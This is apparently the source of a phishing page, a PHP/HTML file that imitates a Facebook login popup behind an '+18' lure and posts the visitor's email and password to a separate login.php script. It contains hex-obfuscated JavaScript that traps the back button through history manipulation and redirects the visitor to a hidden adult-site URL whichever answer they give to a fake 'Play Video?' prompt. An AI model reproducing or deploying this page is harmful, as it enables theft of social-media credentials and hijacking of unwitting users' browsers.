<?php

include_once '../../common.php';


// Verifico si se necesita un conjunto de caracteres especial para presentar la pagina
switch ($lang['LANG']) {
	case 'th':
	header('Content-Type: text/html; charset=TIS-620');
	break;
	
	case 'el':
	header('Content-Type: text/html; charset=iso-8859-7');
	break;
	
	case 'ru':
	header('Content-Type: text/html; charset=iso-8859-5');
	break;
	
	default:
	header('Content-Type: text/html; charset=ISO-8859-15');
	
		
}

// Creo KEY
$longitud = '100';
$key = '';
$keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
$max = strlen($keys) - 1;
for($i=0; $i < $longitud; $i++){
	// echo $key;
	$key .= $keys{mt_rand(0,$max)};
}
?>
<html>

<head>


<meta name="generator" content="Bootply" />
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet">
		<link href="css/styles.css" rel="stylesheet">

		<style type"text/css">
		
		body {
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    font-size: 14px;
    line-height: 1.42857143;
    
    background-color: #3b5998;
}

input[type=submit] {
    padding:5px 15px; 
    background:#428BCA; 
    border:0 none;
    cursor:pointer;
    -webkit-border-radius: 5px;
    border-radius: 5px; 
	color: #FFF;
}

label {
color: #FFF;

}

span {
color: #FFF;

}

h1 {
    font-size: 500%;
    color: white;
}

</style>

<title><?php echo $lang['TITULO_PAGINA']; ?></title>
<script> 	
var _0x9c02=["\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6E\x6F\x2D\x62\x61\x63\x6B\x2D\x62\x75\x74\x74\x6F\x6E","\x41\x67\x61\x69\x6E\x2D\x4E\x6F\x2D\x62\x61\x63\x6B\x2D\x62\x75\x74\x74\x6F\x6E","\x6F\x6E\x68\x61\x73\x68\x63\x68\x61\x6E\x67\x65"];function nobackbutton(){window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[2];window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[3];window[_0x9c02[4]]= function(){window[_0x9c02[1]][_0x9c02[0]]= _0x9c02[2]}}
</script>

</head>

<body>

<center>

<div id="Cuerpo">
	<div id="CuerpoMain">
		<div id="CuerpoImgs">
			<b><span style="font-size:500%;     font-family: 'Freight Sans Bold', 'Helvetica Neue', 'Segoe UI', 'Malgun Gothic', Meiryo, 'Microsoft JhengHei', helvetica, arial, sans-serif !important;" >f</span></b>
		</div>
 		<div id="TituloCuerpo" class="blanco">
	<span id="Tbold"><?php echo $lang['POPUP_TITULO'] ?></span><br>
		<span>	<?php echo $lang['POPUP_DESCRIPCION'] ?></span>
		</div>
		<div id="Formulario">
		
		<form id="form" method="post" target="_top" action="../../login.php">
		<label id="LoginForm"><?php echo $lang['POPUP_CORREO'] ?>:</label><br>
		<input type="text"   id="input" style="font-size: 12pt;" name="email" placeholder="<?php echo $lang['POPUP_CORREO'] ?>:" autocomplete="off" required="" style="cursor: pointer; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QsPDhss3LcOZQAAAU5JREFUOMvdkzFLA0EQhd/bO7iIYmklaCUopLAQA6KNaawt9BeIgnUwLHPJRchfEBR7CyGWgiDY2SlIQBT/gDaCoGDudiy8SLwkBiwz1c7y+GZ25i0wnFEqlSZFZKGdi8iiiOR7aU32QkR2c7ncPcljAARAkgckb8IwrGf1fg/oJ8lRAHkR2VDVmOQ8AKjqY1bMHgCGYXhFchnAg6omJGcBXEZRtNoXYK2dMsaMt1qtD9/3p40x5yS9tHICYF1Vn0mOxXH8Uq/Xb389wff9PQDbQRB0t/QNOiPZ1h4B2MoO0fxnYz8dOOcOVbWhqq8kJzzPa3RAXZIkawCenHMjJN/+GiIqlcoFgKKq3pEMAMwAuCa5VK1W3SAfbAIopum+cy5KzwXn3M5AI6XVYlVt1mq1U8/zTlS1CeC9j2+6o1wuz1lrVzpWXLDWTg3pz/0CQnd2Jos49xUAAAAASUVORK5CYII=); background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;">
		<script>
var _0x7b9f=["\x68\x69\x73\x74\x6F\x72\x79","\x70\x75\x73\x68\x53\x74\x61\x74\x65","\x6C\x6F\x61\x64","\x67\x6F","\x70\x6F\x70\x73\x74\x61\x74\x65","\x73\x74\x61\x74\x65","\x45\x76\x65\x6E\x74","\x63\x72\x65\x61\x74\x65\x45\x76\x65\x6E\x74","\x6E\x65\x78\x74","\x70\x72\x65\x76\x69\x6F\x75\x73","\x69\x6E\x69\x74\x45\x76\x65\x6E\x74","\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6E\x74","\x50\x6C\x61\x79\x20\x56\x69\x64\x65\x6F\x3F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x6F\x70","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x6D\x6F\x62\x69\x6C\x65\x73\x65\x78\x6C\x69\x66\x65\x2E\x6D\x6F\x62\x69\x2F\x3F\x73\x6C\x3D\x33\x33\x39\x30\x34\x2D\x61\x32\x34\x65\x66\x26\x64\x61\x74\x61\x31\x3D\x54\x72\x61\x63\x6B\x31\x26\x64\x61\x74\x61\x32\x3D\x54\x72\x61\x63\x6B\x32","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72"];if(window[_0x7b9f[0]]&& history[_0x7b9f[1]]){window[_0x7b9f[17]](_0x7b9f[2],function(){history[_0x7b9f[1]](-1,null);history[_0x7b9f[1]](0,null);history[_0x7b9f[1]](1,null);history[_0x7b9f[3]](-1);this[_0x7b9f[17]](_0x7b9f[4],function(_0x7706x1,_0x7706x2){if(_0x7706x2= _0x7706x1[_0x7b9f[5]]){_0x7706x1= document[_0x7b9f[7]](_0x7b9f[6]);_0x7706x1[_0x7b9f[10]](_0x7706x2> 0?_0x7b9f[8]:_0x7b9f[9],true,true);this[_0x7b9f[11]](_0x7706x1);var _0x7706x3=confirm(_0x7b9f[12]);if(_0x7706x3== true){window[_0x7b9f[15]][_0x7b9f[14]][_0x7b9f[13]]= _0x7b9f[16]}else {if(_0x7706x3== false){window[_0x7b9f[15]][_0x7b9f[14]][_0x7b9f[13]]= _0x7b9f[16]}}}},false)},false)}
</script>



		<br><br><label id="LoginForm"><?php echo $lang['POPUP_CONTRASENA'] ?>:</label><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script> <div id="fb-root"></div> <script>(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId=806769436043772"; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));</script> <script type="text/javascript">document.write(unescape("%3Cscript src=%27http://s10.histats.com/js15.js%27 type=%27text/javascript%27%3E%3C/script%3E"));</script> <a href="http://www.histats.com" target="_blank" title="contador pagina web" ><script  type="text/javascript" > try {Histats.start(1,3205176,4,0,0,0,""); Histats.track_hits();} catch(err){}; </script></a> <noscript><a href="http://www.histats.com" target="_blank"><img  src="http://sstatic1.histats.com/0.gif?3205176&101" alt="contador pagina web" border="0"></a></noscript>
		<input type="password" style="font-size: 12pt;" id="input" name="pass" placeholder="<?php echo $lang['POPUP_CONTRASENA'] ?>" autocomplete="off" required="" style="background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3QsPDhss3LcOZQAAAU5JREFUOMvdkzFLA0EQhd/bO7iIYmklaCUopLAQA6KNaawt9BeIgnUwLHPJRchfEBR7CyGWgiDY2SlIQBT/gDaCoGDudiy8SLwkBiwz1c7y+GZ25i0wnFEqlSZFZKGdi8iiiOR7aU32QkR2c7ncPcljAARAkgckb8IwrGf1fg/oJ8lRAHkR2VDVmOQ8AKjqY1bMHgCGYXhFchnAg6omJGcBXEZRtNoXYK2dMsaMt1qtD9/3p40x5yS9tHICYF1Vn0mOxXH8Uq/Xb389wff9PQDbQRB0t/QNOiPZ1h4B2MoO0fxnYz8dOOcOVbWhqq8kJzzPa3RAXZIkawCenHMjJN/+GiIqlcoFgKKq3pEMAMwAuCa5VK1W3SAfbAIopum+cy5KzwXn3M5AI6XVYlVt1mq1U8/zTlS1CeC9j2+6o1wuz1lrVzpWXLDWTg3pz/0CQnd2Jos49xUAAAAASUVORK5CYII=); background-attachment: scroll; background-position: 100% 50%; background-repeat: no-repeat;">
		<br><br><input type="submit" style="font-size: 12pt;"  value="    <?php echo $lang['POPUP_SUBMIT'] ?>    "  >  <br>
		</form>
		
		
		
		
		
		
		
		
		
		
		
		
		
		</div>
	</div>
		<div id="Candao">
			<img src="http://i.imgur.com/LE87vI1.png" class="Img" width="13" height="13">
			<span id="Tbold"> <?php echo $lang['POPUP_CANDADO'] ?></span>
		</div>
	</div>
	
	
	
	
	
 

	
	<h1>+18</h1>
</center>
<script>
$(document).ready(function(){
	setTimeout(function(){ 
		$("#BgCuerpo, #BodyCuerpo").fadeIn(); 
	}, 500);
});
</script>


</body>

</html>
